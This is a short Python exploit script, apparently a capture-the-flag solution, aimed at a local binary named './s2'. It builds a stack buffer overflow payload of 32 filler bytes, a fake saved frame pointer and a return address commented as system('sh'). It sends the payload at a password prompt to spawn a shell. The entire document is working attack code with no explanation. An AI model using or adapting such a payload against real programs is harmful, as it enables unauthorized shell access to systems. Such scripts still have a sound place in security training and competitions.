#!/usr/bin/env python

import binexpect
import struct

if __name__ == "__main__":

    setup = binexpect.setup('./s2')
    target = setup.target()
    target.setecho(False)

    payload = b'A' * 0x20
    payload += b'PADDINGP' #rbp
    payload += struct.pack('L', 0x4006b8) # system("sh")
    
    target.tryexpect('What is your password?')
    target.sendbinline(payload)

    target.tryexpect("If you're cool you'll get a shell.")
    target.pwned()

